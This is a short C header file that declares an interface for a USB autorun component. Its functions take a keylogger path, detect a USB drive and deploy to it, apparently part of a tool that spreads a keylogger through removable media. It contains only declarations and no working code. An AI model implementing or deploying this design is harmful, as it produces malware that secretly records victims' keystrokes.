#ifndef USB_AUTORUN_H
#define USB_AUTORUN_H

#include <stdbool.h>

typedef struct USBAutorun USBAutorun;

USBAutorun* usb_autorun_create(void);
void usb_autorun_destroy(USBAutorun* autorun);

bool usb_autorun_setup(USBAutorun* autorun, const char* keylogger_path);
bool usb_autorun_detect_usb(USBAutorun* autorun);
bool usb_autorun_deploy(USBAutorun* autorun);

const char* usb_autorun_get_usb_drive(USBAutorun* autorun);

#endif // USB_AUTORUN_H